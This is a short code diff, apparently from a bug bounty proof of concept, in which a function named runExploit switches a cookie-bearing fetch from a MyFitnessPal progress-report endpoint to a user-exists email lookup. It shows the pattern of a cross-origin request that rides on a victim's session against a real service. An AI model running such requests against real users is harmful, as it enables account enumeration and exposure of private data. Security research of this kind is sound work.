@@ -73,7 +73,7 @@ async function runExploit() {
   output.value = "Running exploit...\n";
 
   try {
-    const res = await fetch("https://www.myfitnesspal.com/api/services/reports/results/progress/1/7", {
+    const res = await fetch("https://www.myfitnesspal.com/api/idm/user-exists?email=karkaritoss%40bugcrowdninja.com", {
       method: "GET",
       credentials: "include"
     });
